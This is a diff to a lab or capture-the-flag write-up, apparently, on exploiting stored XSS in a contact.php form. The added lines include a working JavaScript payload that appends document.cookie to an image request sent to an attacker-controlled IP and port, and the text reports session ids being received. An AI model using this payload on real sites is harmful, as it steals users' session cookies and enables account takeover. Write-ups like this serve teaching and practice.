@@ -146,7 +146,16 @@ Then when I saw `contact.php` I thought what if we could use stored XSS to fetch
 
 ![image](Images/Screenshot%20From%202026-07-11%2013-22-17.png)
 
-> And I started receiving session ids:
+
+> I used this js payload to exploit the stored XSS, fetch the cookie and receive them. And I started receiving session ids:
+
+```js
+<script>
+  var img = new Image();
+  img.src = 'http://192.168.152.35:8000/a.jpg' + encodeURIComponent(document.cookie);
+</script>
+```
+
 
 ```bash
 ┌──(root㉿kali)-[~]
